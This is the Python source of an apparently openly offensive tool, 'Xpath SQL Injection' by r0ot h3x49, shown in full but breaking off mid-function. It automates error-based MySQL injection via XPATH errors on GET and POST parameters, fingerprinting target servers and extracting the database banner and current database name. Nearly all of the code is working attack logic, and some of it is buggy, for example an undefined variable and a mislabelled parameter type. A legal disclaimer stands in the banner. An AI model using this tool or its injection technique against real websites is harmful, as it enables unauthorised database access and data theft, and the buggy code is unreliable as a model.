#!/usr/bin/env python
# Xpath SQL Injection by r0ot h3x49

# imports
from urllib2 import *
import optparse
import sys
from queries import *
from Output import *
from time import time as timer
from time import *
import os
from os.path import expanduser
from urlparse import urlsplit as us
from prettytable import PrettyTable as pt
from itertools import *
import httplib
import requests


def xpbanner():
    YELLOW = "\033[1;33m"
    xp='''
 _    _
\  \/  /___     _   _
 \    /| . |___| |_| |_
 /    \|  _| .'|  _|   |
/_ /\ _|_| |__,|_| |_|_|
                    By - r0ot h3x49 '''
    disc = '''
[!] legal disclaimer: Usage of xpath for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all
applicable local, state and federal laws. Developer assume no liability and are not responsible for any misuse or damage caused by this program
                    
'''
    print  YELLOW + xp
    print fg + sb + disc

def PathToTheOutput(url):
    # Test on  Windows 7
    global logs,payload,logFile,payloadFile,path,Xpath,Output,target
    dirXpath = '.Xpath'
    dirOutput = 'output'
    SplitedName = us(url)
    dirUrl = SplitedName.netloc
    logFile = 'log'
    payloadFile = 'payload.txt'
    if os.name == 'posix':
        path = expanduser("~")
        Xpath = str(path) + '/' + str(dirXpath)
        Output = str(Xpath) + '/' + str(dirOutput)
        target = str(Output) + '/' + str(dirUrl)
        logs = str(target) + '/' + str(logFile)
        payload = str(target) + '/' + str(payloadFile)
        if os.path.exists(path):
            try:
                os.mkdir(str(Xpath))
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
                
        if os.path.exists(Xpath):
            try:
                os.mkdir(str(Output))
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
                
        if os.path.exists(Output):
            try:
                os.mkdir(str(target))
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
            
        if os.path.exists(target):
            try:
                a = open(str(logs),'a')
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                a.close()
                pass
    else:
        path = os.environ['USERPROFILE']
        Xpath = str(path) + '\\' + str(dirXpath)
        Output = str(Xpath) + '\\' + str(dirOutput)
        target = str(Output) + '\\' + str(dirUrl)
        logs = str(target) + '\\' + str(logFile)
        payload = str(target) + '\\' + str(payloadFile)
        if os.path.exists(path):
            try:
                os.mkdir(str(Xpath))
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
                
        if os.path.exists(Xpath):
            try:
                os.mkdir(str(Output))
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
                
        if os.path.exists(Output):
            try:
                os.mkdir(str(target))
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
            
        if os.path.exists(target):
            try:
                a = open(str(logs),'a')
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                a.close()
                pass
            

def CreatePayloadFile():
    global target,payload
    if os.name == 'posix':
        if os.path.exists(target):
            try:
                b = open(str(payload),'w')
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                b.close()
                pass
    else:
        if os.path.exists(target):
            try:
                b = open(str(payload),'w')
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                b.close()
                pass


def DumpedDb(db,tbl):
    global PathToDumpedDb,PathToDumpedTbl
    if os.name == 'posix':
        DirDb = db
        DumpedTbl = tbl + '.csv'
        print DumpedTbl
        PathToDumpedDb = str(target) + '/' + str(DirDb)
        PathToDumpedTbl = str(PathToDumpedDb) + '/' + str(DumpedTbl)
        if os.path.exists(target):
            try:
                os.mkdir(str(PathToDumpedDb))
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
        if os.path.exists(PathToDumpedDb):
            try:
                c = open(str(PathToDumpedTbl),'w')
            except (OSError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                c.close()
                pass
    else:
        DirDb = db
        DumpedTbl = tbl + '.csv'
        PathToDumpedDb = str(target) + '\\' + str(DirDb)
        PathToDumpedTbl = str(PathToDumpedDb) + '\\' + str(DumpedTbl)
        if os.path.exists(target):
            try:
                os.mkdir(str(PathToDumpedDb))
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                pass
        if os.path.exists(PathToDumpedDb):
            try:
                c = open(str(PathToDumpedTbl),'w')
            except (WindowsError, Exception, TypeError, IOError, IndexError) as e:
                pass
            else:
                c.close()
                pass
    

## ----------------------------------------------------------------------------------------------------------------------  ##
##                                              Errors
## ----------------------------------------------------------------------------------------------------------------------  ##

def URLError():
    print br + fw + sb + "["+strftime("%H:%M:%S")+"] [CRITICAL] Unable to Connect to the target xpath is going to retry"
    
def ConnTimeOut():
    print br + fw + sb + "["+strftime("%H:%M:%S")+"] [CRITICAL] connection timed out to the target URL or proxy. xpath is going to retry the request(s)"

def KeyBoardInterrupt():
    print fr + sn + "\n["+strftime("%H:%M:%S")+"] [ERROR] user aborted\n"
    print fw + sn + "[*] shutting down at "+strftime("%H:%M:%S")+"\n"
    sys.exit(0)

## ----------------------------------------------------------------------------------------------------------------------  ##
def HTTPResponses(url, data):
    global wsr,war
    wsr= None
    war = None
    if url != None and data == None:
        try:
            if '*' in url:
                url = url.replace('*','')
            else:
                pass
            req = requests.get(url)
        except Exception:
            pass
        else:
            try:
                web_app_response = req.headers['X-Powered-By']
            except Exception:
                pass
            else:
                #print web_app_response
                war = web_app_response
                pass
            try:
                web_serv_response = req.headers['Server']
            except Exception:
                pass
            else:
                #print web_serv_response
                wsr = web_serv_response
                pass
        
    elif url != None and data != None:
        try:
            if '*' in data:
                data = data.replace('*','')
            else:
                pass
            req = requests.post(url, data=data)
        except Exception:
            pass
        else:
            try:
                web_app_response = req.headers['X-Powered-By']
            except Exception:
                pass
            else:
                #print web_app_response
                war = web_app_response
                pass
            try:
                web_serv_response = req.headers['Server']
            except Exception:
                pass
            else:
               # print web_serv_response
                wsr = web_serv_response
                pass
                
    else:
        pass

    


## ----------------------------------------------------------------------------------------------------------------------  ##

    
def banner(url, data):
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
#------------------------------------------
    f = open(logs,'a')              
#------------------------------------------
## ------------------------------------------------------------------------------------------------
##                              GET DATA INJECTION
## ------------------------------------------------------------------------------------------------
    if url != None and data == None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    print '[-] %s' % e
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching banner"
                                    tmp = ""
                                    for QueryIndex in BANNER:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        banner = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % banner
                                                            if wsr and war:
                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                                                infos += "web server technology: %s, %s\n" % (war, wsr)
                                                            else:
                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                                                infos += "web server technology: %s\n" % wsr
                                                            infos += "back-end DBMS: MySQL %s\n" % banner[:3]
                                                            infos += "banner: %s\n" % banner[:6]
                                                            print fg + sb + "back-end DBMS: MySQL %s"% banner[:3]
                                                            print fg + sb + "banner: '%s'" % banner[:6]
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                                    
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break      
            f.write(infos) 
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:   
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching banner"
            for QueryIndex in BANNER:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                banner = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % banner
                                    if wsr and war:
                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "back-end DBMS: MySQL %s\n" % banner[:3]
                                    infos += "banner: %s\n" % banner[:6]
                                    print fg + sb + "back-end DBMS: MySQL %s"% banner[:3]
                                    print fg + sb + "banner: '%s'" % banner[:6]
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
## ------------------------------------------------------------------------------------------------
##                              POST DATA INJECTION
## ------------------------------------------------------------------------------------------------
    elif url != None and data != None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break   
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                    
                                except IndexError as e:
                                    pass
                                except Exception as e:
                                    #print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    if wsr and war:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching banner"
                                    for QueryIndex in BANNER:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        banner = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % banner
                                                            if wsr and war:
                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                                                infos += "web server technology: %s, %s\n" % (war, wsr)
                                                            else:
                                                                print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                                                infos += "web server technology: %s\n" % wsr
                                                            infos += "back-end DBMS: MySQL %s\n" % banner[:3]
                                                            infos += "banner: %s\n" % banner[:6]
                                                            print fg + sb + "back-end DBMS: MySQL %s"% banner[:3]
                                                            print fg + sb + "banner: '%s'" % banner[:6]
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
##                                                        print '[-] %s' % e
##                                                        sys.exit(0)
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break
                    
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            HTTPResponses(url, data)
            Query_Test = False
            tempfread = tempf.readline()
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching banner"
            for QueryIndex in BANNER:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(url, data=FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                banner = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % banner
                                    if wsr and war:
                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "back-end DBMS: MySQL %s\n" % banner[:3]
                                    infos += "banner: %s\n" % banner[:6]
                                    print fg + sb + "back-end DBMS: MySQL %s"% banner[:3]
                                    print fg + sb + "banner: '%s'" % banner[:6]
                                    
                            except IndexError as e:
                                pass
                            except Exception as e:
##                                print '[-] %s' % e
##                                sys.exit(0)
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
        
    else:
        pass
  

def current_db(url, data):
    global war,wsr
    global logs,payload
    HTTPReqCount = 0
    infos = ""
#------------------------------------------
    f = open(logs,'a')              
#------------------------------------------
## ------------------------------------------------------------------------------------------------
##                              GET DATA INJECTION
## ------------------------------------------------------------------------------------------------
    if url != None and data == None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in url:
                                first, last = url.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (GET)" 
                            else:
                                tgt = url + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '" + fg + sn + test + fg + sn + "'"
                                req = Request(tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
##                                print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                sleep(1)
                                pass
                            except (IOError, httplib.HTTPException) as e:
                                ConnTimeOut()
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            else:
                                try:
                                    respdata = resp.read()
                                    retVal = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                    if 'XPATH syntax error' in respdata:
                                        vul = True
                                        print fg + sb + 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:' % HTTPReqCount
                                        infos += 'xpath identified the following injection point(s) with a total of %d HTTP(s) requests:\n' % HTTPReqCount
                                        print fw + sn + '---'
                                        infos += '---\n'
                                        print fw + sn + 'Parameter: (GET)'
                                        infos += 'Parameter: (GET)\n'
                                        print fw + sn + '\tType: error-based'
                                        infos += '\tType: error-based\n'
                                        print fw + sn + '\tTitle: %s' % test
                                        infos += '\tTitle: %s\n' % test
                                        print fw + sn + '\tPayload: %s' % tgt
                                        infos += '\tPayload: %s\n' % tgt
                                        # ----------------------------------------
                                        # for later usage of dumiping other things
                                        CreatePayloadFile()
                                        with open(payload,'w') as ft:
                                            ft.write('%s' % tgt)
                                            ft.close()
                                        # ----------------------------------------
                                        print fw + sn + '---'
                                        infos += '---\n'
                                except IndexError as e:
                                    pass
                                except Exception as e:
##                                    print '[-] %s' % e
                                    pass
                                except KeyboardInterrupt:
                                    KeyBoardInterrupt()
                                    break
                                else:
                                    Query_Test = False
                                    print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
                                    if wsr and war:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                                        infos += "web server technology: %s, %s\n" % (war, wsr)
                                    else:
                                        print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                                        infos += "web server technology: %s\n" % wsr
                                    infos += "the back-end DBMS is MySQL\n"
                                    print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current database"
                                    for QueryIndex in CURRENTDB:
                                        if not Query_Test:
                                            QueryToTest = ('%s' % QueryIndex)
                                            if '0x72306f74' in tgt:
                                                FinalCountQuery_replaced = tgt.replace('0x72306f74', QueryToTest)
                                                try:
                                                    req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                                                    resp = urlopen(req, timeout=10)
                                                except URLError as e:
                                                    URLError()
                                                    sleep(1)
                                                    pass
                                                except HTTPError as e:
##                                                    print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                                                    sleep(1)
                                                    pass
                                                except (IOError, httplib.HTTPException) as e:
                                                    ConnTimeOut()
                                                    pass
                                                except KeyboardInterrupt:
                                                    KeyBoardInterrupt()
                                                    break
                                                else:
                                                    try:
                                                        respdata = resp.read()
                                                        CurDB = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                                        if 'XPATH syntax error' in respdata:
                                                            Query_Test = True
                                                            print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurDB
                                                            infos += "current database: %s\n" % CurDB
                                                            print fg + sb + "current database: '%s'" % CurDB
                                                    except IndexError as e:
                                                        pass
                                                    except Exception as e:
                                                        #print '[-] %s' % e
                                                        pass
                                                    except KeyboardInterrupt:
                                                        KeyBoardInterrupt()
                                                        break
                                                    
                                        if Query_Test:
                                            break            
                        if vul:
                            break
                    except (TypeError, IOError, IndexError):
                        pass
                    except KeyboardInterrupt:
                        KeyBoardInterrupt()
                        break      
            f.write(infos) 
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            
        else:   
            print fw + sn + "xpath resumed the following injection point(s) from stored session:"
            infos += "\nxpath resumed the following injection point(s) from stored session:\n"
            with open(logs, "r") as prev_session:
                for line in islice(prev_session,1,7):
                    out = line.rstrip()
                    if out:
                        print fw + sn + out
                        infos += out+"\n"
            prev_session.close()
            Query_Test = False
            tempfread = tempf.readline()
            url = None
            print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] the back-end DBMS is MySQL"
            if wsr and war:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s, %s" % (war, wsr)
                infos += "web server technology: %s, %s\n" % (war, wsr)
            else:
                print fw + sn + "["+strftime("%H:%M:%S")+"] [INFO] web server technology: %s" % wsr
                infos += "web server technology: %s\n" % wsr
            infos += "the back-end DBMS is MySQL\n"
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetching current database"
            for QueryIndex in CURRENTDB:
                if not Query_Test:
                    QueryToTest = ('%s' % QueryIndex)
                    if '0x72306f74' in tempfread:
                        FinalCountQuery_replaced = tempfread.replace('0x72306f74', QueryToTest)
                        try:
                            req = Request(FinalCountQuery_replaced, headers={'User-agent':ua})
                            resp = urlopen(req, timeout=10)
                        except URLError as e:
                            URLError()
                            sleep(1)
                            pass
                        except HTTPError as e:
##                            print br + fw + sn + "["+strftime("%H:%M:%S")+"] [CRITICAL] %s | Resource %s "% (e.code, e.msg)
                            sleep(1)
                            pass
                        except (IOError, httplib.HTTPException) as e:
                            ConnTimeOut()
                            pass
                        except KeyboardInterrupt:
                            KeyBoardInterrupt()
                            break
                        else:
                            try:
                                respdata = resp.read()
                                CurDB = respdata.split("XPATH syntax error: '~")[1].split("'")[0]
                                if 'XPATH syntax error' in respdata:
                                    Query_Test = True
                                    print fg + sb + "["+strftime("%H:%M:%S")+"] [INFO] retrieved: %s" % CurDB
                                    infos += "current database: %s\n" % CurDB
                                    print fg + sb + "current database: '%s'" % CurDB
                            except IndexError as e:
                                pass
                            except Exception as e:
                                #print '[-] %s' % e
                                pass
                            except KeyboardInterrupt:
                                KeyBoardInterrupt()
                                break
                            
                if Query_Test:
                    break
            tempf.close()
            f.write(infos)
            f.close()
            print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] fetched data logged to text files under '%s'" % target
            infos = ""
## ------------------------------------------------------------------------------------------------
##                              POST DATA INJECTION
## ------------------------------------------------------------------------------------------------
    elif url != None and data != None:
        try:
            ## have to generate each file with website name to save payload
            tempf = open(payload,'r')
        except (Exception, IOError) as e:
            if 'No such file or directory' in e:
                vul = False
                for prefix, query, sufix, inline_comment in product(PREFIXES, TESTS, SUFIXES, (False, True)):
                    try:
                        if not vul:
                            temp = ("%s%s%s" % (prefix, query, sufix)).replace(" " if inline_comment else "/**/","/**/")
                            if '*' in data:
                                first, last = data.split('*')
                                tgt = first + temp + last
                                #print fc + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing injection on user define parameter: (POST)" 
                            else:
                                tgt = data + temp

                            try:
                                print fg + sn + "["+strftime("%H:%M:%S")+"] [INFO] testing '"+ fg + sn + test + fg + sn + "'"
                                req = Request(url, data=tgt, headers={'User-agent':ua})
                                HTTPReqCount += 1
                                resp = urlopen(req, timeout=10)
                            except URLError as e:
                                URLError()
                                sleep(1)
                                pass
                            except HTTPError as e:
